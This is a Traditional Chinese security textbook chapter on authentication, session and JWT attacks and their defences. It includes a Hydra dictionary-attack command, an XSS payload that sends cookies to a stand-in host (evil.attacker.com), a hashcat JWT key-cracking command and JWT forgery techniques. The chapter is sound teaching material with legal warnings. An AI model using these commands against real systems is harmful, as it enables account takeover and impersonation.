# 第 11 章:認證與 Session 攻防(含 JWT)

> 上一章(第 10 章)的 CSRF、SSRF,玩的是「**繞過**信任」——不去偽造你是誰,而是借用一個既有的信任關係,讓被信任的代理人替攻擊者辦事。
> 這一章不繞了,直接打向信任的**源頭**:「**你是誰**」這個驗證環節本身。
> 密碼怎麼被暴力破解、被外洩帳密撞庫、被少數常見密碼噴灑;登入後那張 session 票券怎麼被偷(劫持)、怎麼被塞給你一張攻擊者早就知道的票券(fixation);
> 以及現代 API 幾乎人手一個、卻錯誤百出的 **JWT(JSON Web Token)**——`alg: none`、弱密鑰、演算法混淆、根本不驗簽……每一個都能讓攻擊者「不用密碼就變成任何人」。
> 認證是安全的地基。地基被打穿,上面蓋再多防禦(輸入編碼、CSRF token)都是白搭——因為攻擊者已經「合法地」是你了。這一章我們把這道地基裡的裂縫一條一條找出來,再一條一條補起來。

## 11.1 認證 vs 授權:先分清楚「你是誰」和「你能做什麼」

開場先釐清一組最常被混用、混用起來會出大事的名詞:

> **認證(Authentication,簡稱 AuthN)= 你是誰。** 系統確認「你真的是你聲稱的那個人」——輸密碼、刷指紋、掃臉、出示一張 token,都是在回答「你是誰」。
>
> **授權(Authorization,簡稱 AuthZ)= 你能做什麼。** 在已經知道你是誰之後,決定「這個身分被允許碰哪些資源、做哪些動作」——你是一般會員還是管理員、能不能看別人的訂單、能不能刪資料。

順序永遠是「先認證、再授權」:系統得先知道你是誰,才能決定你能做什麼。

```
訪客帶著憑證進來
      │
      ▼
┌───────────────┐   認證失敗 → 你根本不是你說的那個人 → 擋在門外
│  認證 AuthN    │──────────────────────────────────────────▶ 401 Unauthorized
│  「你是誰?」   │
└───────┬───────┘   認證成功 → 確認你是 user_42
        │
        ▼
┌───────────────┐   授權失敗 → 你是你沒錯,但這東西不歸你碰
│  授權 AuthZ    │──────────────────────────────────────────▶ 403 Forbidden
│ 「你能碰這個嗎?」│
└───────┬───────┘   授權成功 → 放行
        │
        ▼
     執行動作
```

順帶記一個常被搞反的 HTTP 狀態碼冷知識:`401 Unauthorized` 其實是「**未認證**(沒證明你是誰)」,`403 Forbidden` 才是「已認證但**未授權**(你是你,但沒權限)」。名字取反了,但約定俗成就這樣。

> **關鍵認知**:這兩件事的漏洞**性質完全不同**。認證漏洞是「攻擊者變成了別人」(冒用身分);授權漏洞是「攻擊者還是自己,卻碰到了不該碰的東西」(越權)。**本章專治認證**——把「你是誰」這道關卡打穿。至於「你是你沒錯,但你憑什麼看別人的訂單、改別人的資料」這種越權問題(IDOR、水平/垂直提權),留給第 12 章。務必分清:很多人把「我改了 URL 的 id 就看到別人資料」當成認證漏洞,其實那是**授權**漏洞。

## 11.2 密碼攻擊:針對「你知道什麼」這個因素

認證的三大因素(factor):你**知道**什麼(密碼)、你**擁有**什麼(手機、金鑰)、你**是**什麼(生物特徵)。密碼是「你知道什麼」,也是至今最普遍、最脆弱的一環。針對密碼的攻擊有一整個家族,別混為一談——它們的「打法」和「怎麼被擋」都不同。

> **提醒**:以下手法只在你自己搭的靶場(第 01 章)或官方授權平台(DVWA、PortSwigger Academy)進行。對他人系統做暴力破解、撞庫,在台灣觸犯《刑法》第 358 條(入侵)、第 359 條等妨害電腦使用罪(第 00 章),不因「我只是試密碼」而例外。深入的雜湊破解(hashcat / John)留到第 15 章專章講,這裡先建立「線上攻擊」的全景。

| 攻擊 | 一句話定義 | 攻擊者手上有什麼 | 為什麼有效 | 主要剋星 |
|------|-----------|-----------------|-----------|---------|
| **暴力破解 Brute Force** | 窮舉所有可能的密碼組合 | 一個帳號 | 密碼太短、無限次嘗試 | rate limit + 帳號鎖定 |
| **字典攻擊 Dictionary** | 拿「常見密碼字典」逐一試 | 一個帳號 + 密碼字典(如 rockyou.txt) | 人類愛用弱密碼、常見詞 | 強密碼政策 + rate limit |
| **憑證填充 Credential Stuffing** | 拿「別站外洩的帳密」來這站試 | 一大批「帳號+密碼」配對 | 使用者到處用同一組密碼 | MFA + 異常偵測 |
| **密碼噴灑 Password Spraying** | 用少數常見密碼配大量帳號 | 一大批帳號 + 幾個熱門密碼 | 避開「單一帳號連錯」的鎖定 | 跨帳號監控 + MFA |
| **預設密碼 Default Creds** | 直接用出廠/文件裡的預設帳密 | 一份預設帳密清單 | 沒人改 admin/admin | 強制首次改密碼 |

### 暴力破解與字典攻擊:窮舉 vs 猜常見的

**暴力破解**是最笨也最無腦的:把字元組合從 `aaaa` 一路試到 `zzzz`。純暴力對「夠長的密碼」在數學上不可行(每多一位,組合數乘上數十倍),所以實戰幾乎沒人純暴力。**字典攻擊**才是主力——不猜所有組合,只猜「人類真的會用的密碼」:`123456`、`password`、`qwerty`、公司名+年份……著名的 `rockyou.txt`(從一次真實外洩流出的 1400 萬筆密碼)就是最常用的字典。

工具層面,線上表單的暴力/字典攻擊最常見的是 **Hydra**(點到即止):

```bash
# hydra —— 針對一個登入表單做字典攻擊(僅限授權靶場!)
hydra -l admin \                       # ① -l:指定單一帳號 admin(-L 則是帳號清單檔)
      -P rockyou.txt \                  # ② -P:密碼字典檔,逐個試
      target.local \                    # ③ 目標主機
      http-post-form \                  # ④ 攻擊型態:HTTP POST 表單
      "/login:user=^USER^&pass=^PASS^:F=登入失敗"
      #  └ 送出路徑 : 表單欄位(^USER^/^PASS^ 會被代入) : F=失敗特徵字串
      #    Hydra 靠「回應裡有沒有『登入失敗』這串字」判斷這次猜對了沒
```

第 ④ 行的 `F=登入失敗` 是關鍵:攻擊者要先觀察「猜錯時頁面回什麼」,把那個特徵告訴 Hydra,它才能自動判斷成敗。這也暗示了一個防禦盲點——**登入失敗訊息太精確會幫倒忙**(見 11.10)。

### 憑證填充:撞庫,拿外洩帳密去別站試

**憑證填充(credential stuffing)** 是近年最猖獗的攻擊,因為它**成本極低、成功率卻不低**。原理利用了人性最大的弱點:**重複使用密碼**。

```
① 某論壇被拖庫,1000 萬組「email + 密碼」流到暗網(這種外洩多到用 GB 計)
     ↓
② 攻擊者假設:「這些人裡,一定有一大票在銀行、購物網也用同一組密碼」
     ↓
③ 拿這 1000 萬組,自動化地去「別的網站」逐一登入試
     ↓
④ 就算只有 0.5% 的人重複用密碼 → 也有 5 萬個帳號直接被登入成功
```

> **心智模型**:憑證填充不是「破解你的密碼」,而是「**你的密碼早就在別的地方被洩了,攻擊者只是拿來這裡對號入座**」。它不需要猜——它手上有的是「真的密碼」,只是不確定你在這站有沒有用同一組。這也是為什麼「這站沒被駭,帳號還是被盜」會發生:破口在別站,不在你這。

### 密碼噴灑:反過來,少數密碼配大量帳號

**密碼噴灑(password spraying)** 是「憑證填充」的孿生兄弟,方向相反,而且**專門設計來繞過帳號鎖定**。

一般的暴力破解是「一個帳號猛試很多密碼」——這會很快觸發「連錯 5 次鎖定」。噴灑反過來:

```
暴力/字典(縱向):  admin ← 試 password1, password2, password3... (連錯 → 帳號被鎖)
密碼噴灑(橫向):  試 "Summer2024!" 這一個密碼 →
                    對 alice、bob、carol、dave... 幾千個帳號各試「一次」
                    ↓
                每個帳號都只錯一次,遠不到鎖定門檻 → 完美避開帳號鎖定
                只要幾千人裡有一個真的用了 "Summer2024!",就進去了
```

> **關鍵認知**:密碼噴灑之所以陰險,是它讓「單一帳號連續失敗鎖定」這個經典防禦**完全失效**——因為每個帳號都只失敗一次。要擋它,必須從「**跨帳號、跨來源 IP 的整體異常**」去看(短時間內大量帳號都收到同一個來源的失敗登入),這是 11.10 會強調的「異常偵測」層次,單靠 per-account 鎖定擋不住。

### 預設密碼:最不該存在、卻永遠存在的洞

路由器 `admin/admin`、資料庫 `root` 空密碼、後台 `admin/password123`……廠商出廠設定的預設帳密,寫在公開手冊裡,攻擊者有整理好的清單(如 SecLists 裡的 default-credentials)。第 05 章列舉、第 04 章 OSINT 常常第一步就是「試試預設密碼」,因為**驚人比例的系統從沒改過**。防禦簡單到不像話:**強制首次登入必須改密碼、上線前檢查沒有任何預設帳號存活**。

## 11.3 Session 是怎麼運作的:HTTP 無狀態,靠一張票券記住你

密碼只在「登入那一刻」驗一次。但 HTTP 是**無狀態(stateless)** 的——每個請求對伺服器來說都像是陌生人第一次來。那登入後的每一個請求,伺服器怎麼知道「這是剛剛登入的那個人」?靠 **session**。

```
① 登入:使用者送出正確帳密
        │
        ▼
② 伺服器驗證通過 → 在「伺服器端」建立一筆 session 記錄:
     session_store["a8f3d9e1c7b2..."] = { user: "alice", login_time: ... }
                     ▲
                     └ 這串隨機值叫 Session ID(SID),是這次登入的「票券號碼」
        │
        ▼
③ 伺服器把 SID 透過 Set-Cookie 發給瀏覽器:
     Set-Cookie: session=a8f3d9e1c7b2...; HttpOnly; Secure; SameSite=Lax
        │
        ▼
④ 之後每個請求,瀏覽器自動帶上這張票券:
     Cookie: session=a8f3d9e1c7b2...
        │
        ▼
⑤ 伺服器拿 SID 去 session_store 查 → 「喔,這是 alice」→ 當作已登入處理
```

關鍵在**第 ②③④ 步**:真正的身分資訊(「這是 alice」)存在**伺服器端**,cookie 裡只有一串**沒有意義的隨機票號**。攻擊者就算看到 cookie 是 `session=a8f3d9e1c7b2`,也無法從這串字反推出任何東西——除非他能拿到那張票、或猜到票號。

> **心智模型**:Session ID = **一張衣帽間的號碼牌**。你把外套(身分)寄放在衣帽間(伺服器),換得一張號碼牌(SID cookie)。之後你不用再證明外套是你的,只要出示號碼牌,店員就把外套給你。這個模型直接點出兩個攻擊面:①**偷走別人的號碼牌**(session 劫持,11.4),我拿你的牌就能領你的外套;②**在你進門前塞給你一張我早就有副本的號碼牌**(session fixation,11.5),等你把外套寄放上去,我拿手上的副本也能領。

> **關鍵認知**:登入之後,那張 session 票券的價值**等同於密碼**——拿到它就等於拿到你的登入狀態,而且**完全不需要密碼**。這就是為什麼第 09 章的 XSS 偷 `document.cookie` 這麼致命,也是本章接下來兩節的核心。

## 11.4 Session 劫持:偷走那張票,不用密碼就變成你

**Session 劫持(session hijacking)**:攻擊者設法拿到受害者的 session ID,把它塞進自己的瀏覽器,伺服器一查票號「喔這是 alice」,於是攻擊者**在毫無密碼的情況下,直接以 alice 的身分操作**。

拿到別人 SID 的常見管道:

| 竊取途徑 | 怎麼偷 | 主要防禦 | 回扣章節 |
|---------|--------|---------|---------|
| **XSS** | 注入 JS 讀 `document.cookie` 傳走 | `HttpOnly`(JS 讀不到) | 第 09 章 |
| **明文竊聽** | 未加密 HTTP 下在網路上攔封包 | 全站 HTTPS + `Secure` 屬性 | 第 02 章、Nginx 課程 |
| **SID 進了網址/日誌** | SID 放在 URL 參數 → 被 Referer、瀏覽紀錄、伺服器 log 外洩 | SID 只放 cookie,絕不放 URL | 本章 |
| **可預測的 SID** | SID 不夠隨機(如遞增數字、時間戳)被猜出 | 用 CSPRNG 產生高熵 SID | 本章 / 第 17 章 |

最經典的還是搭配 XSS。回顧第 09 章那段偷 cookie 的 payload:

```js
// 若站上有 XSS(第 09 章),這段 JS 在受害者瀏覽器執行:
new Image().src = "https://evil.attacker.com/steal?c=" + document.cookie;
// document.cookie 若含 session ID → 整張票券送到攻擊者伺服器
// 攻擊者把這串 SID 塞進自己瀏覽器的 cookie → 立刻變成受害者
```

這也正是第 09 章強調 `HttpOnly` 的原因:**加了 `HttpOnly`,`document.cookie` 就讀不到 session cookie**,這條最省事的偷票路直接斷掉。但別以為 `HttpOnly` 是萬靈丹——XSS 仍能「以受害者身分直接發請求」(第 09 章 9.6),只是偷不到票券本身而已。

> **心智模型**:session 劫持 = **偷號碼牌**。它和 CSRF(第 10 章)的差別很重要,別搞混:CSRF **不偷票券**,它是「利用你手上的票券自動被帶上」去騙伺服器辦事;session 劫持則是**真的把票券偷到手**,攻擊者從此可以在**任何時間、任何地點、脫離受害者**地冒用身分。偷到票的危害更持久——除非那張票被作廢(登出、逾時、伺服器端撤銷,見 11.6)。

**防劫持的四道基本功**(細節見 11.10):①SID 用 CSPRNG 產生、夠長夠隨機,讓人猜不到;②cookie 加 `HttpOnly`(擋 XSS 偷)+ `Secure`(只走 HTTPS,擋竊聽)；③SID 絕不放在 URL 裡;④**登入成功後立刻換發新的 SID**(這一招同時擋下一節的 fixation)。

## 11.5 Session Fixation:塞給你一張我早就知道號碼的票

Session fixation(session 固定攻擊)比劫持更狡猾:攻擊者**不需要「偷」你的票**,而是**在你登入之前,先塞給你一張「他自己也握有副本」的票**。等你用這張票完成登入,伺服器把「alice 已登入」綁到這張票上——而攻擊者手裡的副本,現在也成了「alice 已登入」的有效票券。

它成立的**前提**是一個常見的伺服器缺陷:**登入前後,session ID 沒有改變**。逐步拆解整條攻擊:

```
① 攻擊者先自己去 target.com 拿一個「還沒登入」的合法 session ID
   例如伺服器發給他 SID = XYZ123(此時 XYZ123 是「未登入」狀態)
        │
        ▼
② 攻擊者想辦法讓「受害者的瀏覽器」用上這個 XYZ123。手法例如:
     - 釣魚連結:target.com/login?sessionid=XYZ123(若站台接受 URL 帶 SID)
     - 若有 XSS 或子網域漏洞,用 document.cookie 幫受害者「種」下 XYZ123
        │
        ▼
③ 受害者用 XYZ123 這張票,在 target.com「正常登入」(輸入自己的真帳密)
        │
        ▼
④ 【病根】伺服器登入成功後,沒有換發新 SID —— 還是繼續用 XYZ123,
   只是把它的狀態從「未登入」升級成「alice 已登入」
        │
        ▼
⑤ 攻擊者手上那張 XYZ123 的副本,現在也是「alice 已登入」了 →
   攻擊者直接用它冒充 alice,全程不需要 alice 的密碼
```

看出關鍵在**第 ④ 步**了嗎?整個攻擊的命門是「**登入這個動作沒有讓票券換號**」。攻擊者是在受害者登入**之前**就佈好了那張票,他不是事後去偷(那是劫持),而是**事前給你一張他早有副本的票**。

> **心智模型**:劫持 vs fixation 的差別——劫持是「**你進去了,我從你口袋偷走號碼牌**」;fixation 是「**進門前我硬塞給你一張號碼牌,而我手上留了同號的副本**」。前者攻擊者在「事後偷」,後者在「事前埋」。理解這個時間差,你就懂為什麼**防禦完全不同**:防劫持靠「讓票偷不到」(HttpOnly、HTTPS);防 fixation 靠「**登入成功的那一刻,強制換發一張全新的 SID,作廢舊的**」——這樣攻擊者事前埋的那張票在登入後立刻失效,他手裡的副本變成廢紙。

> **關鍵認知**:「登入後換發 session ID」(session regeneration / renewal)是**一行程式碼等級的防禦,卻擋掉一整類攻擊**。PHP 的 `session_regenerate_id(true)`、各大框架的等價機制,都是在登入成功後立刻呼叫。這也是 11.4 提到「登入後換 SID」能一石二鳥的原因——它同時斷了 fixation。

## 11.6 登出、逾時、「記住我」:被忽略的三個坑

登入寫得再嚴,「登入之後」的生命週期管理常常被忽略,而這裡的坑一樣能讓票券被濫用。

**坑一:登出沒有真的作廢票券。** 很多系統的「登出」只是叫瀏覽器刪掉 cookie,**伺服器端那筆 session 記錄還活著**。如果攻擊者之前已經偷到 SID(11.4),你按了登出他照樣能用——因為票號在伺服器端還有效。

> **關鍵認知**:登出必須是**伺服器端作廢(server-side invalidation)**——把 session_store 裡那筆記錄刪掉/標記失效,而不只是刪瀏覽器 cookie。「客戶端刪 cookie」只是禮貌性動作,真正的登出是「讓這張票號從此在伺服器端查不到」。這也預告了 JWT 的一大痛點(11.7):無狀態 JWT **天生難以在伺服器端作廢**。

**坑二:逾時(timeout)沒設或設太長。** 兩種逾時都要有:

- **閒置逾時(idle timeout)**:一段時間沒動作就失效(如 15–30 分鐘)。防的是「使用者離開座位忘了登出,票券還活著」。
- **絕對逾時(absolute timeout)**:不管有沒有在用,票券發出後最長只活 N 小時。防的是「被偷的票無限期有效」。

沒有逾時的 session,等於「一次登入、永久有效」——被偷一次就永遠淪陷。

**坑三:「記住我(Remember Me)」把方便換成了風險。** 「記住我」通常是發一個**長效 token**(存 cookie,幾週到幾個月),讓你不用每次重登。它的坑:

- 這個長效 token 若設計不良(例如就是「帳號+密碼的雜湊」或可預測的值),被偷或被猜到就是長期淪陷。
- 正解:記住我 token 要是**高熵隨機值、存在伺服器端可被撤銷、和 session 分開管理、綁定裝置、能單獨作廢**。而且——**敏感操作(改密碼、付款)絕不能只靠「記住我」的身分**,要求重新輸入密碼(step-up 認證,呼應第 10 章 10.6 的敏感操作二次確認)。

> **心智模型**:一張票券的安全,不只看「發得嚴不嚴」,還要看「**能不能收得回來、會不會自己過期**」。發票(登入)、驗票(每個請求)、退票(登出作廢)、票券保鮮期(逾時)——四個環節缺一不可。多數人只顧著把「發票」做嚴,忘了後面三個。

## 11.7 JWT 深入:header.payload.signature 逐段拆解

現代 API、SPA、微服務幾乎人手一個 **JWT(JSON Web Token,唸 "jot")**。它和 11.3 的傳統 session 是**兩種不同的思路**,搞懂差異才懂它的坑:

- **傳統 session**:身分存**伺服器端**,cookie 只有票號。伺服器要查 store 才知道你是誰(**有狀態 stateful**)。
- **JWT**:身分**直接寫在 token 裡**,伺服器**不存任何東西**,靠「驗證簽章」確認這張 token 沒被竄改(**無狀態 stateless**)。好處是可橫向擴展(任何一台機器都能獨立驗證,不用共享 session store)。

一個 JWT 長這樣,用兩個 `.` 分成三段:

```
eyJhbGciOiJIUzI1NiJ9  .  eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0  .  Xr8f...簽章...
└──── header ────┘       └───────── payload ──────────┘           └── signature ──┘
   (演算法宣告)              (你是誰、有什麼權限)                     (防竄改的印章)
```

三段都是 **Base64URL 編碼**(注意:是**編碼**,不是加密!),逐段拆:

**① Header(標頭)**:宣告用什麼演算法簽章。

```json
{ "alg": "HS256", "typ": "JWT" }
// alg:簽章演算法(HS256 = HMAC-SHA256 對稱;RS256 = RSA 非對稱)—— 這個欄位是後面一堆災難的源頭!
// typ:token 類型
```

**② Payload(負載)**:放「宣告(claims)」——你是誰、角色、過期時間等。

```json
{
  "sub": "alice",        // subject:這張 token 代表誰
  "role": "user",        // 自訂宣告:角色(注意這個,11.8 會拿它開刀)
  "iat": 1719900000,     // issued at:簽發時間
  "exp": 1719903600      // expiration:過期時間(Unix 時間戳)—— 沒檢查它就出事(11.8 ⑤)
}
```

> **關鍵認知(整章最重要的一句)**:**Payload 只是 Base64URL 編碼,不是加密!任何人拿到 JWT 都能解出 payload 讀個一清二楚。** Base64 不是密碼學,是「換一種字元表示法」,人人可逆。你可以現在就打開瀏覽器 console 貼上 `atob("eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0")`,`{"sub":"alice","role":"user"}` 直接跳出來。

```js
// 在任何瀏覽器 console 就能「讀」出別人 JWT 的 payload —— 完全不需要密鑰
const jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.Xr8f...";
const payload = JSON.parse(atob(jwt.split('.')[1]));  // 取第二段、Base64 解碼、parse
console.log(payload);   // → { sub: "alice", role: "user" }  秘密全都露
```

> **新手誤區**:「JWT 有簽章,所以裡面的資料很安全」——大錯特錯。簽章保證的是「**內容沒被竄改**」(完整性 integrity),**不是「內容看不到」(機密性 confidentiality)**。所以:**絕對不要把密碼、信用卡號、任何機密放進 JWT payload**。它是「防偽的明信片」,不是「上鎖的保險箱」——郵差(任何中間人、任何持有者)都能讀,只是改不了。

**③ Signature(簽章)**:防竄改的印章。以 HS256 為例,簽章 = 用一把**只有伺服器知道的密鑰(secret)**,對 `header.payload` 算 HMAC:

```
signature = HMAC-SHA256( base64url(header) + "." + base64url(payload), 秘密密鑰 )
```

伺服器收到 token 時,拿同一把密鑰**重算一次簽章**,和 token 附的簽章比對:

- **相等** → 這張 token 確實是我簽的、內容沒被動過 → 信任 payload 說的「你是 alice」。
- **不等** → 內容被改過、或簽章者沒有密鑰 → 拒絕。

因為攻擊者**沒有密鑰**,他就算把 payload 改成 `"role":"admin"`,也算不出對應的合法簽章,伺服器一驗就穿幫。**這是 JWT 安全的全部根基:一切都押在「簽章驗證做對了」。** 下一節就是講——當簽章驗證做錯,會發生什麼。

## 11.8 JWT 五大致命錯誤:每一個都能讓你變 admin

JWT 的安全**全靠簽章驗證**。偏偏這一步錯誤百出,而且錯法都很經典。以下五個是實戰與 CTF 裡反覆出現的殺招——每個都配「攻擊怎麼做 / 為什麼成立 / 怎麼防」。

> **提醒**:以下手法只在授權靶場(Juice Shop、PortSwigger JWT labs)練習。偽造 token 冒充他人身分存取真實系統,是不折不扣的未授權存取,觸犯《刑法》妨害電腦使用罪。

### 錯誤 ①:`alg: none` —— 告訴伺服器「這張票不用蓋章」

**攻擊怎麼做**:JWT 規範裡有一個「不簽章」的演算法叫 `none`。攻擊者把 header 的 `alg` 改成 `none`,把 payload 改成 `"role":"admin"`,然後**簽章那一段直接留空**:

```
攻擊者偽造的 token(第三段簽章是空的):
  base64url({"alg":"none"}) . base64url({"sub":"alice","role":"admin"}) .
                                                                          ▲ 簽章留空
```

**為什麼成立**:某些函式庫看到 `alg: none`,就**真的跳過簽章驗證直接接受**——等於伺服器問「這票蓋章了嗎」,票說「我這種票不用蓋章喔」,伺服器就信了。於是攻擊者想寫什麼 payload 都行。

**怎麼防**:**伺服器端明確指定、寫死允許的演算法**,絕不讓 token 自己的 `alg` 欄位來決定怎麼驗。驗證時只接受 `HS256`(或你選定的演算法),看到 `none` 一律拒絕。

```js
// ✘ 危險:讓 token 自己說要用什麼演算法驗(等於讓小偷自己決定要不要被搜身)
jwt.verify(token, key);
// ✔ 正確:伺服器寫死只接受 HS256,none 直接被拒
jwt.verify(token, key, { algorithms: ['HS256'] });
```

### 錯誤 ②:弱簽章密鑰 —— HMAC 密鑰太爛,被爆破出來

**攻擊怎麼做**:HS256 的安全全靠那把密鑰夠強。如果開發者用了 `secret`、`123456`、`password` 這種弱密鑰,攻擊者可以**離線爆破**:拿一個真實 token,用字典逐個試「哪把密鑰算出來的簽章對得上」。工具是 **hashcat**(第 15 章詳述):

```bash
# hashcat 模式 16500 = JWT。拿一個攔到的真 token,離線爆破 HMAC 密鑰
hashcat -a 0 -m 16500 captured.jwt rockyou.txt
#         │      │        │           └ 密鑰字典
#         │      │        └ 那張真 token(header.payload.signature)
#         │      └ 16500:JWT HMAC 破解模式
#         └ -a 0:字典攻擊模式
# 一旦跑出密鑰 → 攻擊者就能用它「合法地」簽發任何 payload(把自己簽成 admin)
```

**為什麼成立**:HMAC 是離線可驗的——攻擊者不用連上伺服器,自己在筆電上就能瘋狂試密鑰,一秒幾百萬次。密鑰只要在字典裡或夠短,遲早被撞出來。撞出密鑰後,攻擊者和伺服器**握有同一把密鑰**,他簽的 token 和真的一模一樣。

**怎麼防**:HMAC 密鑰要**夠長、夠隨機**(至少 256 bit 的高熵隨機值,用 CSPRNG 產生),當成和資料庫密碼同級的機密保管,別寫死在原始碼、別 commit 進 git。

### 錯誤 ③:演算法混淆 RS256 → HS256 —— 拿公鑰當 HMAC 密鑰

這是最精巧、最能體現「原理理解」的一個。**攻擊怎麼做**:

```
背景:
  - RS256 是「非對稱」:伺服器用「私鑰」簽章,用「公鑰」驗章。公鑰是「公開」的(拿得到)。
  - HS256 是「對稱」:簽和驗用「同一把密鑰」。

攻擊步驟:
  ① 攻擊者拿到伺服器的 RS256「公鑰」(公鑰本來就公開,或從 /jwks 端點抓)
  ② 攻擊者把 token 的 alg 從 RS256 改成 HS256
  ③ 用「那把公鑰的字串」當作 HS256 的「對稱密鑰」,去簽自己偽造的 payload
  ④ 送給伺服器
```

**為什麼成立**:關鍵漏洞在——伺服器的驗證程式碼**用 token 的 `alg` 欄位決定怎麼驗**。當它看到 `alg: HS256`,就拿「它手上那把 RS256 公鑰」當成 HMAC 密鑰去驗。而攻擊者簽章時用的**正是同一把公鑰字串**——於是兩邊「密鑰」一致,簽章驗證通過!攻擊者利用了「公鑰是公開的」這件事:在 RS256 下公鑰只能驗不能簽(安全),但一旦被降級成 HS256,**公鑰就同時變成了簽章密鑰**。

```
RS256(安全):  攻擊者只有公鑰 → 只能「驗」,簽不出東西
HS256(被騙): 攻擊者拿公鑰當對稱密鑰 → 「簽」和「驗」都用它 → 偽造成功
                      ▲ 公鑰從「公開的驗證工具」變成了「人人可用的簽章密鑰」
```

**怎麼防**:同錯誤 ①——**伺服器寫死演算法**。你的系統若用 RS256,驗證時就只接受 RS256,絕不接受 HS256,`alg` 欄位不允許改變驗證方式。「明確指定演算法」一招同時擋掉錯誤 ① 和 ③。

### 錯誤 ④:根本不驗簽 —— 只解碼,不驗證

**攻擊怎麼做**:有些偷懶的程式碼只做了 `decode`(解出 payload 讀內容),**跳過了 `verify`(驗簽章)**:

```js
// ✘ 致命:decode 只解碼、不驗簽!攻擊者隨便改 payload 都被接受
const payload = jwt.decode(token);          // 只解碼,完全沒驗證簽章對不對
if (payload.role === 'admin') { /* 放行 */ }// 攻擊者把 role 改成 admin 就進來了
```

**為什麼成立**:`decode` 只是把 Base64 那三段拆開讀出來,它**壓根不檢查簽章**。攻擊者把 payload 改成 `"role":"admin"`、簽章亂填,`decode` 照樣讀出 `role: admin`。等於「印章印歪印錯都沒差,因為根本沒人看印章」。

**怎麼防**:**永遠用 `verify`,不要用 `decode` 做認證判斷**。`verify` 會檢查簽章;`decode` 只在「你已經驗過、純粹想讀內容」時用。這是 JWT 函式庫最常被誤用的 API。

### 錯誤 ⑤:過期(exp)不檢查 —— 一張永不失效的萬能票

**攻擊怎麼做**:payload 裡的 `exp` 標了過期時間,但**驗證邏輯沒去比對它**。於是一張三個月前簽發、早該作廢的 token,今天拿來用照樣通行。攻擊者只要弄到一張舊 token(從 log、從舊裝置、從外洩),就能無限期使用。

**為什麼成立**:`exp` 只是 payload 裡的一個數字,**它不會自己生效**——要靠驗證程式主動比對「`exp` 有沒有小於現在時間」。很多手刻的驗證忘了這一步。（承接 11.6:JWT 因為無狀態,伺服器不存 session,所以**難以主動作廢**一張已簽發的 token——這放大了「不檢查 exp」的危害:你連事後撤銷都做不到。）

**怎麼防**:①用成熟函式庫並確認它**預設檢查 `exp`**;②`exp` 設**短**(存取 token 建議分鐘級,如 15 分鐘），搭配 refresh token 換發;③敏感系統考慮伺服器端維護撤銷清單(見 11.10)。

**JWT 五大錯誤總覽**:

| 錯誤 | 攻擊本質 | 根因 | 對症的防禦 |
|------|---------|------|-----------|
| ① `alg: none` | 讓伺服器跳過驗簽 | 信任 token 自報的演算法 | **伺服器寫死演算法**,拒絕 none |
| ② 弱 HMAC 密鑰 | 離線爆破出密鑰再偽簽 | 密鑰太短/太弱 | 高熵長密鑰、當機密保管 |
| ③ RS256→HS256 混淆 | 拿公鑰當對稱密鑰偽簽 | 用 token 的 alg 決定驗法 | **伺服器寫死演算法**,只收 RS256 |
| ④ 不驗簽 | 只 decode 不 verify | 誤用函式庫 API | 一律 `verify`,別用 `decode` 做認證 |
| ⑤ 不檢查 exp | 用早該作廢的舊 token | 忘了比對過期時間 | 短 exp + 函式庫預設驗 exp |

> **心智模型**:JWT 五大錯誤,前三個(none、弱密鑰、演算法混淆)其實在回答同一個問題——「**誰決定這張票怎麼驗?**」錯誤答案是「讓票自己說了算」(信任 header 的 `alg`),正確答案是「**伺服器說了算**」(寫死演算法、寫死密鑰)。這和第 09、10 章一路的主軸完全一致:**永遠不要信任『資料自己聲稱的東西』**——payload 自稱是 admin、header 自稱用 none、URL 自稱是外部圖片,通通要由受信任的一方(伺服器)重新把關。

## 11.9 MFA 多因素認證:多一道關卡,以及它怎麼被繞過

前面的攻擊都圍繞「密碼」這**單一因素**。只要那道防線破了(被撞庫、被釣、被爆破),帳號就沒了。**多因素認證(Multi-Factor Authentication,MFA;兩個因素時常叫 2FA)** 的思路:**要求「不同類別」的多個因素同時成立**,讓攻擊者就算拿到密碼,也還缺另一把鑰匙。

三大因素類別(要「不同類別」才算真 MFA):

- **你知道什麼(knowledge)**:密碼、PIN。
- **你擁有什麼(possession)**:手機收到的 OTP、驗證器 App 的動態碼(TOTP)、實體安全金鑰。
- **你是什麼(inherence)**:指紋、臉、虹膜。

> **關鍵認知**:MFA 是對抗**憑證填充和密碼噴灑(11.2)最有效的單一措施**——因為攻擊者手上就算有一大把「正確的密碼」,他沒有你的第二因素,還是進不來。統計上,加了 MFA 能擋掉絕大多數的自動化帳號盜用。**這是本章防禦裡 CP 值最高的一招。**

但 MFA 不是萬能,常見的**繞過**(點到即止,提醒它不是免死金牌):

- **OTP 即時釣魚(real-time phishing)**:攻擊者架一個「即時轉發」的釣魚站(如 evilginx 這類 reverse-proxy 中間人),你在假站輸入密碼**和當下的 OTP**,攻擊者即時轉發到真站登入。因為 OTP 是「你知道+你當下輸入的」,一樣會被騙走。這就是為什麼「**簡訊/App OTP 不是 phishing-resistant(抗釣魚)**」。
- **SIM swap(SIM 卡挾持)**:攻擊者用社交工程騙電信商把你的門號移轉到他的 SIM 卡,於是**簡訊 OTP 全部落到他手上**。這也是「簡訊 OTP」被認為是最弱一種 MFA 的原因。
- **MFA 疲勞轟炸(MFA fatigue / prompt bombing)**:對用「App 推播批准」的系統,攻擊者半夜狂發批准請求,受害者被煩到隨手按了「允許」。

**真正抗釣魚的 MFA:FIDO2 / passkey(概念)**。FIDO2/WebAuthn 標準(以及消費端的 **passkey**)用的是**公私鑰密碼學 + 綁定網域**:

```
為什麼 FIDO2/passkey 抗釣魚:
  ① 登入時,你的裝置(手機/安全金鑰)用「私鑰」對挑戰值簽章,私鑰永不離開裝置
  ② 這個簽章「綁定了正在造訪的網域」——只對真正的 bank.com 有效
  ③ 就算你被騙到 evil-bank.com,裝置一看網域不對,根本簽不出能用在 bank.com 的東西
     → 攻擊者的即時轉發釣魚(evilginx)這一招直接失效
```

> **心智模型**:OTP 是「你把一個秘密**輸進**某個網站」——所以會被釣(你可能輸進假網站)。FIDO2/passkey 是「你的裝置**針對特定網域產生一個簽章**」——網域對不上就簽不出來,騙不了。**「抗釣魚」的本質,是把『判斷網域對不對』這件事從『容易被騙的人腦』移交給『不會被騙的密碼學』。** 這也是業界從簡訊 OTP 往 passkey 遷移的根本原因。

